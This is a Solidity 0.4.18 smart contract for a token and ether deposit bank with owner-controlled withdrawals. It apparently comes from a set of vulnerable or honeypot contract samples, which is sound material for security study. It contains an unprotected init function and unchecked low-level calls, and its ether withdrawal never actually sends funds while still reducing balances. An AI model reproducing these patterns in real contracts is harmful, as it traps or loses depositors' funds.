pragma solidity ^0.4.18;

contract Ownable {
    struct OwnerInfo {
        address currentOwner;
        address newOwner;
    }
    OwnerInfo ownerInfo = OwnerInfo(msg.sender, address(0));

    function changeOwner(address addr)
    public
    onlyOwner
    {
        ownerInfo.newOwner = addr;
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender == ownerInfo.newOwner) {
            ownerInfo.currentOwner = ownerInfo.newOwner;
        }
    }
    
    modifier onlyOwner {
        if(ownerInfo.currentOwner == msg.sender) _;
    }
}

contract Token is Ownable {
    function WithdrawToken(address token, uint256 amount, address to)
    public 
    onlyOwner
    {
        token.call(bytes4(sha3("transfer(address,uint256)")), to, amount); 
    }
}

contract TokenBank is Token {
    struct BankInfo {
        uint MinDeposit;
        address currentOwner;
    }
    BankInfo bankInfo;
    mapping (address => uint) public Holders;

    function initTokenBank()
    public
    {
        bankInfo.currentOwner = msg.sender;
        bankInfo.MinDeposit = 1 ether;
    }
    
    function() payable {
        Deposit();
    }
   
    function Deposit() 
    payable
    {
        if(msg.value > bankInfo.MinDeposit) {
            Holders[msg.sender] += msg.value;
        }
    }
    
    function WitdrawTokenToHolder(address _to, address _token, uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to] > 0) {
            Holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[msg.sender] > 0) {
            if(Holders[_addr] >= _wei) {
                _addr.call.value(_wei);
                Holders[_addr] -= _wei;
            }
        }
    }
}